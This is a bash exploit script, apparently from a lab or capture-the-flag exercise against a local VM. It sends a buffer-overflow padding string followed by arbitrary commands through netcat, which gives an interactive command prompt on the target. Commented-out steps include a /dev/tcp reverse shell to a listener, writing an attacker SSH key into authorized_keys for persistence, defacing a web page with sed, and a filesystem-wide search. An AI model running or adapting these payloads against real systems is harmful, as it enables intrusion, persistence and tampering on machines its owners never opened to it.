overflow=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
#doesnt work
#com="find / -type f -exec cat {} + | grep 'challenge'"

#read file
#com="cat /var/www/html/index.html"

#add tomaz to the file
#com='sed -i "/VM)<\/p>/a<p>Tomaz Silva was here</p>" /var/www/html/index.html'

#delete tomaz
#com='sed -i "/Tomaz/d" /var/www/html/index.html'


#1. do reverse shell - cant get this to work
# on host 
#nc -lvnp 4242

# on target
#com='bash -i >& /dev/tcp/192.168.10.1/4242 0>&1'


#do public key and try again

#on client do before
#nc -lvnp 4242

#2. input
target_ip="192.168.56.101"
target_port=1234

#listen on port of host and redirect stdin and stdout to the port on my host 

#3. ssh
#p1="echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAI' > .ssh/authorized_keys"
#p2="sed -i 's/AI/AIHUeRbxmrM1q505pim4BS4zmqgWEwa4IbLXCXeHf1dtl tomhoq@fedora/' .ssh/authorized_keys"

# Construct the full payload
#final="${overflow}${p1}"    
# Send payload using netcat
#echo "$p1" | nc $target_ip $target_port | sed -z 's/.*for //'
#final="${overflow}${p2}"
# Send payload using netcat
#echo "$p2" | nc $target_ip $target_port | sed -z 's/.*for //'

# Loop for user input
while true; do
    read -p "cmd> " user_input
    [[ "$user_input" == "quit" ]] && break

    # Construct the full payload
    final="${overflow}${user_input}"

    # Send payload using netcat
    echo "$final" | nc $target_ip $target_port | sed -z 's/.*for //'
    
        

done

